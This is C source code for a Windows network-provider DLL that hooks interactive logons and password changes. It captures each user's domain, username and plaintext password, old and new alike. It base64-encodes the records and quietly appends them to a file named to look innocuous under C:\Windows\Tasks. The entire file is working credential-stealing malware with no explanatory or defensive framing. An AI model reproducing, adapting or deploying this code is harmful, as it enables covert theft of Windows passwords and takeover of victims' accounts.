#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <stdio.h>

#define WNNC_SPEC_VERSION                0x00000001
#define WNNC_SPEC_VERSION51              0x00050001
#define WNNC_NET_TYPE                    0x00000002
#define WNNC_START                       0x0000000C
#define WNNC_WAIT_FOR_START              0x00000001
#ifndef FILE_PATH
#define FILE_PATH TEXT("C:\\Windows\\Tasks\\default.txt")
#endif

typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, *PUNICODE_STRING;
typedef enum _MSV1_0_LOGON_SUBMIT_TYPE { MsV1_0InteractiveLogon = 2, MsV1_0Lm20Logon, MsV1_0NetworkLogon, MsV1_0SubAuthLogon, MsV1_0WorkstationUnlockLogon = 7, MsV1_0S4ULogon = 12, MsV1_0VirtualLogon = 82, MsV1_0NoElevationLogon = 83, MsV1_0LuidLogon = 84, } MSV1_0_LOGON_SUBMIT_TYPE, *PMSV1_0_LOGON_SUBMIT_TYPE;
typedef struct _MSV1_0_INTERACTIVE_LOGON { MSV1_0_LOGON_SUBMIT_TYPE MessageType; UNICODE_STRING LogonDomainName; UNICODE_STRING UserName; UNICODE_STRING Password; } MSV1_0_INTERACTIVE_LOGON, *PMSV1_0_INTERACTIVE_LOGON;


LPWSTR GetCurrentTimestamp()
{
    SYSTEMTIME st;
    GetLocalTime(&st);

    LPWSTR timestamp = (LPWSTR)malloc(21 * sizeof(WCHAR));
    if (!timestamp)
        return NULL;

   swprintf(timestamp, 21, L"%04d-%02d-%02d %02d:%02d:%02d",
             st.wYear, st.wMonth, st.wDay,
             st.wHour, st.wMinute, st.wSecond);

    return timestamp;
}


LPWSTR BuildLogString(LPCWSTR operation, PUNICODE_STRING domain, PUNICODE_STRING username, PUNICODE_STRING password, LPCWSTR timestamp)
{
    size_t operationLength = wcslen(operation);
    size_t timestampLength = wcslen(timestamp);
    size_t domainLength = domain->Length / sizeof(WCHAR);
    size_t usernameLength = username->Length / sizeof(WCHAR);
    size_t passwordLength = password->Length / sizeof(WCHAR);
    size_t totalLength = timestampLength + operationLength + domainLength + usernameLength + passwordLength + 100;

    LPWSTR logString = (LPWSTR)malloc(totalLength * sizeof(WCHAR));
    if (!logString)
        return NULL;

    swprintf(logString, totalLength,
        L"{\"timestamp\":\"%s\",\"operation\":\"%.*s\",\"domain\":\"%.*s\",\"username\":\"%.*s\",\"password\":\"%.*s\"}",
        timestamp,
        (int)operationLength, operation,
        (int)domainLength, domain->Buffer,
        (int)usernameLength, username->Buffer,
        (int)passwordLength, password->Buffer);
    return logString;
}


LPWSTR LPWSTRToBase64UTF8(LPWSTR input)
{
    if (!input) return NULL;

    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, input, -1, NULL, 0, NULL, NULL);
    if (utf8Len == 0) return NULL;

    char* utf8Str = (char*)LocalAlloc(LMEM_ZEROINIT, utf8Len);
    if (!utf8Str) return NULL;

    if (!WideCharToMultiByte(CP_UTF8, 0, input, -1, utf8Str, utf8Len, NULL, NULL)) {
        LocalFree(utf8Str);
        return NULL;
    }

    DWORD base64LenA = 0;
    if (!CryptBinaryToStringA((BYTE*)utf8Str, utf8Len - 1, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64LenA)) {
        LocalFree(utf8Str);
        return NULL;
    }

    char* base64A = (char*)LocalAlloc(LMEM_ZEROINIT, base64LenA);
    if (!base64A) {
        LocalFree(utf8Str);
        return NULL;
    }

    if (!CryptBinaryToStringA((BYTE*)utf8Str, utf8Len - 1, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64A, &base64LenA)) {
        LocalFree(utf8Str);
        LocalFree(base64A);
        return NULL;
    }

    LocalFree(utf8Str);

    int base64LenW = MultiByteToWideChar(CP_ACP, 0, base64A, -1, NULL, 0);
    if (base64LenW == 0) {
        LocalFree(base64A);
        return NULL;
    }

    LPWSTR base64W = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, base64LenW * sizeof(WCHAR));
    if (!base64W) {
        LocalFree(base64A);
        return NULL;
    }

    if (!MultiByteToWideChar(CP_ACP, 0, base64A, -1, base64W, base64LenW)) {
        LocalFree(base64A);
        LocalFree(base64W);
        return NULL;
    }

    LocalFree(base64A);
    return base64W;
}


void SavePassword(PWCHAR operation, PUNICODE_STRING domain, PUNICODE_STRING username, PUNICODE_STRING password)
{
    LPWSTR timestamp = GetCurrentTimestamp();
    LPWSTR logString = BuildLogString(operation, domain, username, password, timestamp);
    logString = LPWSTRToBase64UTF8(logString);
    wcsncat(logString, L"\n", 2);

    HANDLE hFile;
    DWORD dwWritten;
    hFile = CreateFile(
        FILE_PATH,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile != INVALID_HANDLE_VALUE)
    {
        SetFilePointer(hFile, 0, NULL, FILE_END);
        WriteFile(hFile, logString, (DWORD)wcslen(logString) * sizeof(WCHAR), &dwWritten, NULL);
        CloseHandle(hFile);
    }
}


__declspec(dllexport)
DWORD
APIENTRY
NPGetCaps(
    DWORD nIndex
)
{
    switch (nIndex)
    {
    case WNNC_SPEC_VERSION:
        return WNNC_SPEC_VERSION51;

    case WNNC_NET_TYPE:
        return WNNC_CRED_MANAGER;

    case WNNC_START:
        return WNNC_WAIT_FOR_START;

    default:
        return 0;
    }
}


__declspec(dllexport)
DWORD
APIENTRY
NPLogonNotify(
    PLUID lpLogonId,
    LPCWSTR lpAuthInfoType,
    LPVOID lpAuthInfo,
    LPCWSTR lpPrevAuthInfoType,
    LPVOID lpPrevAuthInfo,
    LPWSTR lpStationName,
    LPVOID StationHandle,
    LPWSTR* lpLogonScript
)
{
    SavePassword(
        L"LOGON",
        &(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->LogonDomainName),
        &(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->UserName),
        &(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->Password));
    lpLogonScript = NULL;
    return WN_SUCCESS;
}


__declspec(dllexport)
DWORD
APIENTRY
NPPasswordChangeNotify(
    LPCWSTR lpAuthentInfoType,
    LPVOID lpAuthentInfo,
    LPCWSTR lpPreviousAuthentInfoType,
    LPVOID lpPreviousAuthentInfo,
    LPWSTR lpStationName,
    LPVOID StationHandle,
    DWORD dwChangeInfo
)
{
    SavePassword(
        L"PWD_UPDATE_OLD",
        &(((MSV1_0_INTERACTIVE_LOGON*)lpPreviousAuthentInfo)->LogonDomainName),
        &(((MSV1_0_INTERACTIVE_LOGON*)lpPreviousAuthentInfo)->UserName),
        &(((MSV1_0_INTERACTIVE_LOGON*)lpPreviousAuthentInfo)->Password));
    SavePassword(
        L"PWD_UPDATE_NEW",
        &(((MSV1_0_INTERACTIVE_LOGON*)lpAuthentInfo)->LogonDomainName),
        &(((MSV1_0_INTERACTIVE_LOGON*)lpAuthentInfo)->UserName),
        &(((MSV1_0_INTERACTIVE_LOGON*)lpAuthentInfo)->Password));

    SetLastError(WN_NOT_SUPPORTED);
    return WN_NOT_SUPPORTED;
}